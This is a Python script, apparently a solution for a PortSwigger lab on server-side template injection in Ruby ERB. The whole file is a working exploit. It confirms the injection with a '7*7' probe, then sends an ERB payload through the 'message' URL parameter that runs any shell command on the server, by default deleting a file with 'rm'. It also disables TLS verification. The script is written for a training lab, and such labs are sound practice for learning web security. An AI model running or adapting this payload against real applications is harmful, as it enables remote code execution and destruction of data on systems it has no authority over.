#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Basic server-side template injection (ERB).

Injects an ERB RCE payload via the ?message= URL parameter to delete
/home/carlos/morale.txt.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def detect_ssti(session: requests.Session, lab: str) -> bool:
    payload = "<%= 7*7 %>"
    r = session.get(f"{lab}/", params={"message": payload})
    return "49" in r.text


def exploit(session: requests.Session, lab: str, cmd: str) -> None:
    payload = f"<%= `{cmd}` %>"
    r = session.get(f"{lab}/", params={"message": payload})
    print(f"[*] Response status: {r.status_code}")
    # system() returns true/false; backtick returns command output
    if "morale" not in r.text:
        print("[+] Command executed (no error in response)")
    else:
        print(f"[*] Response snippet: {r.text[:300]}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve SSTI Lab 1 (basic ERB)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument(
        "--cmd",
        default="rm /home/carlos/morale.txt",
        help="Command to execute (default: delete morale.txt)"
    )
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print("[*] Detecting SSTI via <%= 7*7 %>...")
    if detect_ssti(s, lab):
        print("[+] SSTI confirmed (got 49)")
    else:
        print("[-] SSTI not detected — proceeding anyway")

    print(f"[*] Executing: {args.cmd}")
    exploit(s, lab, args.cmd)
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
